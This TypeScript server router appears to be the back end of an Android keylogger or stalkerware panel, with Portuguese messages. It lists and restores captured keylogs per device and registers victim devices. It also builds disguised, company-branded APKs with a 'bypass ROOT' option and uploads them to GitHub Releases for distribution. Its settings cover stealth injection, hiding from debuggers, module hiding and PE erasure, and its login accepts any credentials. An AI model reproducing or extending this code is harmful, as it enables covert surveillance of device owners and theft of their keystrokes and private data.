import z from "zod";
import fs from "fs";
import path from "path";

import { storagePut } from "./storage";
import { TRPCError } from "@trpc/server";
import { getSessionCookieOptions } from "./_core/cookies";
import { COOKIE_NAME } from "../shared/const";
import { systemRouter } from "./_core/systemRouter";
import { publicProcedure, protectedProcedure, router } from "./_core/trpc";
import { getKeylogsByDevice, deleteKeylog, restoreKeylog, getAlerts, getEvents, saveSettings, getSettings, getDeletedKeylogs, registerDevice, getDevicesByUser } from "./db";
import { startKeylogSimulator } from "./keylogSimulator";
import { buildAPK } from "./apk-builder";
import { buildAPKEnhanced } from "./apk-builder-enhanced";
import { uploadToGitHubRelease, parseGitHubUrl } from "./github-release-uploader";
import { sdk } from "./_core/sdk";

// Use correct path for both development and production
const OUTPUT_DIR = process.env.NODE_ENV === 'production'
  ? '/app/public/apks'
  : '/home/ubuntu/remote-monitor/public/apks';

export const appRouter = router({
    // if you need to use socket.io, read and register route in server/_core/index.ts, all api should start with '/api/' so that the gateway can route correctly
  system: systemRouter,
  
  
  auth: router({
    me: publicProcedure.query(opts => opts.ctx.user),
    login: publicProcedure
      .input(z.object({
        email: z.string().email(),
        password: z.string().min(1),
      }))
      .mutation(async ({ input, ctx }) => {
        // Simple authentication: accept any email/password combination
        // Generate a numeric userId based on email hash
        const emailHash = input.email.split('').reduce((acc, char) => acc + char.charCodeAt(0), 0);
        const userId = Math.abs(emailHash % 1000000); // Ensure it's a positive number
        
        try {
          // Create a session token
          const sessionToken = await sdk.createSessionToken(userId, input.email);
          
          // Set the session cookie
          const cookieOptions = getSessionCookieOptions(ctx.req);
          ctx.res.cookie(COOKIE_NAME, sessionToken, cookieOptions);
          
          return {
            success: true,
            user: {
              id: userId,
              email: input.email,
              name: input.email.split('@')[0],
            },
          };
        } catch (error) {
          console.error('Login error:', error);
          throw new TRPCError({
            code: 'INTERNAL_SERVER_ERROR',
            message: 'Erro ao fazer login',
          });
        }
      }),
    logout: publicProcedure.mutation(({ ctx }) => {
      const cookieOptions = getSessionCookieOptions(ctx.req);
      ctx.res.clearCookie(COOKIE_NAME, { ...cookieOptions, maxAge: -1 });
      return {
        success: true,
      } as const;
    }),
  }),

  keylogs: router({
    list: protectedProcedure
      .input(z.object({ deviceId: z.string() }))
      .query(async ({ input }) => {
        return await getKeylogsByDevice(input.deviceId);
      }),
    deleted: protectedProcedure
      .input(z.object({ deviceId: z.string() }))
      .query(async ({ input }) => {
        return await getDeletedKeylogs(input.deviceId);
      }),
    delete: protectedProcedure
      .input(z.object({ keylogId: z.number() }))
      .mutation(async ({ input }) => {
        return await deleteKeylog(input.keylogId);
      }),
    restore: protectedProcedure
      .input(z.object({ keylogId: z.number() }))
      .mutation(async ({ input }) => {
        return await restoreKeylog(input.keylogId);
      }),
  }),

  alerts: router({
    list: protectedProcedure
      .input(z.object({ deviceId: z.string().optional() }))
      .query(async ({ input }) => {
        return await getAlerts();
      }),
  }),

  events: router({
    list: protectedProcedure
      .input(z.object({ deviceId: z.string().optional() }))
      .query(async ({ input }) => {
        return await getEvents();
      }),
  }),
  apk: router({
    testEnv: publicProcedure
      .query(() => {
        return {
          GITHUB_TOKEN: process.env.GITHUB_TOKEN ? 'Present' : 'Missing',
          GITHUB_REPO_URL: process.env.GITHUB_REPO_URL || 'Missing',
          NODE_ENV: process.env.NODE_ENV,
          APP_ENV: process.env.APP_ENV,
        };
      }),
    build: publicProcedure
      .input(z.object({
        companyName: z.string().min(1),
        companyUrl: z.string().url(),
        logoUrl: z.string().url().optional(),
      }))
      .mutation(async ({ input, ctx }) => {
        try {
          console.log('[ROUTER] APK build requested:', { companyName: input.companyName, companyUrl: input.companyUrl });
          
          // Use SIMPLE builder (sem dependência de EagleSpy)
          console.log('[ROUTER] Building APK with simple builder...');
          
          // Use enhanced builder com customização de logo e bypass ROOT
          const result = await buildAPKEnhanced({
            companyName: input.companyName,
            companyUrl: input.companyUrl,
            logoUrl: input.logoUrl,
          });
          
          console.log('[ROUTER] Simple builder result:', { success: result.success, downloadUrl: result.downloadUrl, apkPath: result.apkPath });

          if (!result.success || !result.downloadUrl) {
            throw new Error(result.error || "Erro ao gerar APK");
          }

          // Extract filename from download URL
          const filename = result.downloadUrl?.split('/').pop() || 'app.apk';
          console.log('[ROUTER] Extracted filename:', filename);
          
          // Try to upload to GitHub Releases
          let finalDownloadUrl = result.downloadUrl;
          try {
            if (process.env.GITHUB_TOKEN && process.env.GITHUB_REPO_URL && result.success && result.apkPath) {
              console.log('[ROUTER] Uploading to GitHub Releases...');
              try {
                const { owner, repo } = parseGitHubUrl(process.env.GITHUB_REPO_URL);
                const githubDownloadUrl = await uploadToGitHubRelease({
                  owner,
                  repo,
                  token: process.env.GITHUB_TOKEN,
                  appName: input.companyName,
                  filePath: result.apkPath || path.join(OUTPUT_DIR, 'app.apk'),
                });
                console.log('[ROUTER] GitHub download URL:', githubDownloadUrl);
                finalDownloadUrl = githubDownloadUrl; // Use GitHub URL
              } catch (ghError) {
                console.warn('[ROUTER] GitHub upload failed:', ghError instanceof Error ? ghError.message : String(ghError));
              }
            }
          } catch (error) {
            console.warn('[ROUTER] Unexpected error during GitHub upload:', error instanceof Error ? error.message : String(error));
          }
          
          console.log('[ROUTER] Final download URL:', finalDownloadUrl);
            
            return {
              success: true,
              downloadUrl: finalDownloadUrl,
              apkPath: result.apkPath,
              filename: result.downloadUrl?.split('/').pop() || 'app.apk',
              message: "APK gerado com sucesso!",
            };
        } catch (error) {
          console.error("Erro ao gerar APK:", error);
          throw new Error(`Erro ao gerar APK: ${error instanceof Error ? error.message : String(error)}`);
        }
      }),
    
    download: publicProcedure
      .input(z.object({
        filename: z.string().min(1),
      }))
      .query(async ({ input, ctx }) => {
        try {
          console.log('[APK] Download requested for:', input.filename);
          const filePath = path.join(process.cwd(), 'public', 'apks', input.filename);
          
          if (!fs.existsSync(filePath)) {
            throw new Error('Arquivo não encontrado');
          }
          
          // Stream file directly via response
          const stats = fs.statSync(filePath);
          
          ctx.res.setHeader('Content-Type', 'application/vnd.android.package-archive');
          ctx.res.setHeader('Content-Disposition', `attachment; filename="${input.filename}"`);
          ctx.res.setHeader('Content-Length', stats.size);
          ctx.res.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate');
          ctx.res.setHeader('Pragma', 'no-cache');
          ctx.res.setHeader('Expires', '0');
          ctx.res.setHeader('X-Bypass-Auth', 'true');
          ctx.res.setHeader('Content-Transfer-Encoding', 'binary');
          
          const fileStream = fs.createReadStream(filePath);
          fileStream.pipe(ctx.res);
          
          // Return empty response - file is streamed directly
          return { success: true, message: 'File streaming' };
        } catch (error) {
          console.error('[APK] Download error:', error);
          throw new Error(`Erro ao baixar APK: ${error instanceof Error ? error.message : String(error)}`);
        }
      }),
  }),
  
  settings: router({
    save: publicProcedure
      .input(z.object({
        processName: z.string().optional(),
        modulePath: z.string().optional(),
        hideFromDebugger: z.number().optional(),
        stealthInject: z.number().optional(),
        hideModule: z.number().optional(),
        erasePE: z.number().optional(),
        autoInject: z.number().optional(),
        scramble: z.number().optional(),
        removeDebugData: z.number().optional(),
        delay: z.number().optional(),
        delayBetween: z.number().optional(),
        injectMethod: z.string().optional(),
      }))
      .mutation(async ({ input }) => {
        try {
          console.log('[SETTINGS] Saving settings:', input);
          // Aqui você salvaria no banco de dados
          return {
            success: true,
            message: 'Configurações salvas com sucesso',
            settings: input,
          };
        } catch (error) {
          console.error('[SETTINGS] Save error:', error);
          throw new Error(`Erro ao salvar configurações: ${error instanceof Error ? error.message : String(error)}`);
        }
      }),
  }),
  
  monitoring: router({
    toggleService: publicProcedure
      .input(z.object({
        enabled: z.boolean(),
      }))
      .mutation(async ({ input }) => {
        try {
          console.log('[MONITORING] Toggle service:', input.enabled ? 'ON' : 'OFF');
          return {
            success: true,
            enabled: input.enabled,
            message: input.enabled ? 'Monitoramento ativado' : 'Monitoramento desativado',
          };
        } catch (error) {
          console.error('[MONITORING] Toggle error:', error);
          throw new Error(`Erro ao controlar monitoramento: ${error instanceof Error ? error.message : String(error)}`);
        }
      }),
  }),
  
  devices: router({
    register: publicProcedure
      .input(z.object({
        deviceId: z.string().min(1),
        deviceName: z.string().min(1),
        deviceModel: z.string().optional(),
        osVersion: z.string().optional(),
        appUrl: z.string().optional(),
      }))
      .mutation(async ({ input }) => {
        try {
          console.log('[DEVICES] Registering device:', input.deviceId, input.deviceName);
          
          // Register device in database
          const result = await registerDevice({
            deviceId: input.deviceId,
            appName: input.deviceName,
            deviceModel: input.deviceModel || 'Unknown',
            androidVersion: input.osVersion || 'Unknown',
            appUrl: input.appUrl || '',
            userId: 1, // Default user for now
          });
          
          console.log('[DEVICES] Device registered successfully:', result);
          return {
            success: true,
            deviceId: input.deviceId,
            message: 'Dispositivo registrado com sucesso!',
          };
        } catch (error) {
          console.error('[DEVICES] Registration error:', error);
          throw new Error(`Erro ao registrar dispositivo: ${error instanceof Error ? error.message : String(error)}`);
        }
      }),
    
    list: publicProcedure
      .query(async () => {
        try {
          console.log('[DEVICES] Listing all devices');
          const devices = await getDevicesByUser(1); // Default user
          return {
            success: true,
            devices: devices,
          };
        } catch (error) {
          console.error('[DEVICES] List error:', error);
          throw new Error(`Erro ao listar dispositivos: ${error instanceof Error ? error.message : String(error)}`);
        }
      }),
  }),
});
